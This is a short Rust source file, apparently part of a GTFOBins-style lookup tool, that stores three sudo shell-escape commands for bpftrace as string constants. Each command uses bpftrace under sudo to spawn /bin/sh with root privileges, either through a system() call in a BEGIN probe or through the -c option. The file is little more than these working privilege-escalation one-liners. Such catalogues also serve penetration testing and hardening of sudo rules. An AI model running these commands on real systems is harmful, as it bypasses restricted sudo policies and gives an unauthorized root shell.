pub static BIN_NAME: &'static str = "bpftrace";
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'
"#;
pub static SUDO_CODE_2: &'static str = r#"
    
    TF=$(mktemp)
    echo 'BEGIN {system("/bin/sh");exit()}' >$TF
    sudo bpftrace $TF
"#;
pub static SUDO_CODE_3: &'static str = r#"
    
    sudo bpftrace -c /bin/sh -e 'END {exit()}'
"#;
pub fn doc() {}
use crate::code::{Code, Tag};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
